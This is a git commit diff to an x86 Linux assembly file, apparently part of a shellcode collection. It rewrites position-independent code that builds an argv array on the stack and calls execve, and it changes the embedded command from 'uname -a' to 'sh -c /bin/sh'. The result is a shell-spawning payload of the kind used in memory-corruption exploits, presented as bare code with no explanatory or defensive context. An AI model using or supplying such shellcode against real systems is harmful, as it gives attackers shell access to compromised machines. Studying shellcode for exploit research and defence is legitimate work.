30bde37712757fe12254fc90fb87a22e4b706305
wjlandryiii <wjlandryiii@gmail.com>
2014-09-17 18:14:06 -0700

    readme

--- linux_x86/un/execve.s
+++ linux_x86/un/execve.s
@@ -5,45 +5,49 @@
 .section .text
 .global _start
 
+.set SYS_exit,1
+.set SYS_execve,11
+
 _start:
-	jmp end
+	jmp	end
 begin:
-	popl %esi
-	
-	pushl $0x0 # argv[n] = NULL
-	
-	movl %esi, %eax
-	jmp outer_loop_entry
+	popl	%esi
 
-outer_loop:
-	add $0x1, %eax
-outer_loop_entry:
-	cmpb $0x0, (%eax)
-	jz continue
-	pushl %eax # argv[n]
-inner_loop:
-	cmpb $0x0, (%eax)
-	jz outer_loop
-	add $0x1, %eax
-	jmp inner_loop
+build_argv:	
+	pushl	$0		# argv[n] = NULL
+	movl	%esi, %eax
+	jmp	2f
+
+1:
+	add	$1, %eax
+2:
+	cmpb	$0, (%eax)
+	jz	continue
+	pushl	%eax			# argv[n]
+3:
+	cmpb	$0, (%eax)
+	jz	1b
+	add	$1, %eax
+	jmp	3b
+
 continue:
-
-	pushl $0x0 #envp[0] = NULL
+	pushl	$0x0			#envp[0] = NULL
 	
-	movl %esp, %edx # char *envp[]
-	lea 0x4(%esp), %ecx # char *argv[]
-	movl (%ecx), %ebx # char *filename
-	movl $0xb, %eax # sys_execve(char *filename, char *argv[], char *envp[])
-	int $0x80
+	movl	%esp, %edx		# char *envp[]
+	lea	0x4(%esp), %ecx		# char *argv[]
+	movl	(%ecx), %ebx		# char *filename
+	movl	$SYS_execve,%eax	# sys_execve()
+	int	$0x80
 
 exit:
-	mov $0x1, %eax # sys_exit()
-	mov $0x0, %ebx # int status
-	int $0x80
+	mov	$1,%ebx			# int status
+	mov	$SYS_exit,%eax
+	int	$0x80
 
 end:
 	call begin
 
 params:
-.ascii "-a\000"
-.ascii "/bin/uname\000\000"
+.ascii "sh\000"
+.ascii "-c\000"
+.ascii "/bin/sh\000\000"
